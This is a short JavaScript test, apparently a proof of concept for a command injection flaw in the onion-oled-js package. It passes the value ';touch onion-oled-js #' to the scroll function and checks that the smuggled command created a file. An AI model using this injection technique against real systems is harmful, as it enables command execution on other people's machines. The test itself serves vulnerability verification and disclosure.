test("Command Injection in onion-oled-js", () => {
  expect.assertions(2);
  const OLEDExp = require("onion-oled-js").OLEDExp;
  const fs = require("fs");
  const path = "./onion-oled-js";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return OLEDExp.scroll(";touch onion-oled-js #").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
